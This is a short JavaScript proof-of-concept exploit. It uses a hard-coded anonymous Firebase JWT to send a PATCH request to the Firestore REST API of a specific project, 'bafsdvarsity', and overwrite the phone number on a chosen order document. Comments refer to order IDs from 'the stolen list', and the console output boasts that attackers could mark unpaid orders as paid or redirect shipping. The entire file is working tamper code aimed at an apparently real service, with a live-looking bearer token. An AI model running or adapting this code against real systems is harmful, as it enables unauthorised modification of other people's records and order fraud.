const HACKER_TOKEN = "eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjNzQ5NTFmNjBhMDE0NzE3ZjFlMzA4ZDZiMjgwZjQ4ZjFlODhmZGEiLCJ0eXAiOiJKV1QifQ.eyJwcm92aWRlcl9pZCI6ImFub255bW91cyIsImlzcyI6Imh0dHBzOi8vc2VjdXJldG9rZW4uZ29vZ2xlLmNvbS9iYWZzZHZhcnNpdHkiLCJhdWQiOiJiYWZzZHZhcnNpdHkiLCJhdXRoX3RpbWUiOjE3NjQ5MDgyMDQsInVzZXJfaWQiOiJXOUYwd3BMSkpOVlZxV0NkYzlEV3h1WDYzc2sxIiwic3ViIjoiVzlGMHdwTEpKTlZWcVdDZGM5RFd4dVg2M3NrMSIsImlhdCI6MTc2NDkwODIwNCwiZXhwIjoxNzY0OTExODA0LCJmaXJlYmFzZSI6eyJpZGVudGl0aWVzIjp7fSwic2lnbl9pbl9wcm92aWRlciI6ImFub255bW91cyJ9fQ.DsP7xVlUEK4IqDjv9VbR3FkGDCt9JYHIDgKwMhWW0LdArDMw7K1_cGMtGtHuIhg3qTtHg-DOT1OfF45_Crl_3FC8XymMLVYpMTsQdAV5GV884ukRyafU0kKlMDfmx4CK109KEAKDUl2hQ5kXFnSn5q_uHhh6jvJpVPBB6pvB4asY2eivKXorTLHJo3c3nP9vu3TQDt43b30sVfRXLATngvAeeaxsswuu1cJnUj8ThHG9mwSXN8lhIbKYIwPUD1fo_89wrjxIIGx-v4zCBBJiOyfYRaitwb4ibw3ln_sN7WLHtzdW9TdEOQXr6fHHdRTj8xcEUsVB3yd95IJHqnICfg"; 
const PROJECT_ID = "bafsdvarsity";
// Replace this with a REAL Order ID you saw in the stolen list
const TARGET_ORDER_ID = "PASTE_TARGET_ORDER_ID_HERE"; 

const PATH = `artifacts/bafsdvarsity/public/data/orders/${TARGET_ORDER_ID}`;
const url = `https://firestore.googleapis.com/v1/projects/${PROJECT_ID}/databases/(default)/documents/${PATH}?currentDocument.exists=true`;

const payload = {
  fields: {
    // We are only trying to update the phoneNumber to prove we can edit data
    phoneNumber: { stringValue: "000000_HACKED" }
  }
};

console.log("✏️ Attempting to tamper with order data...");

fetch(url + "&updateMask.fieldPaths=phoneNumber", {
  method: 'PATCH',
  headers: {
    'Authorization': 'Bearer ' + HACKER_TOKEN,
    'Content-Type': 'application/json'
  },
  body: JSON.stringify(payload)
})
.then(res => res.json())
.then(data => {
  if (data.fields) {
    console.log("%c🚨 TAMPER SUCCESSFUL!", "color: red; font-size: 20px; font-weight: bold;");
    console.log("I just changed the data for Order ID: " + TARGET_ORDER_ID);
    console.log("New Phone Number:", data.fields.phoneNumber.stringValue);
    console.log("IMPACT: Hackers can mark unpaid orders as 'PAID' or change shipping addresses.");
  } else {
    console.log("Update Failed (Safe?):", data);
  }
});